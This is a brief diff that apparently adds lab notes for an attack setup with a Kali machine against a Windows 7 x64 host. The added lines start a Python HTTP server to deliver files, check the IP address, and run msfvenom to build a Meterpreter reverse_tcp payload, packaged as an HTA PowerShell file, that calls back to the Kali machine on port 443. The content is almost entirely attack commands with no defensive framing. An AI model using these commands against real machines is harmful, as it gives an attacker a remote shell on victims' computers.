@@ -1,2 +1,9 @@
 ++ PC1: Kali
 ++ PC2: Windows 7 x64
+
+
+++ PC1: python3 -m http.server 8080
+++ PC1: ip addr show
+++ PC1: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_PC1> LPORT=443 -f
+hta-psh -o <nombre_archivo.hta>
+
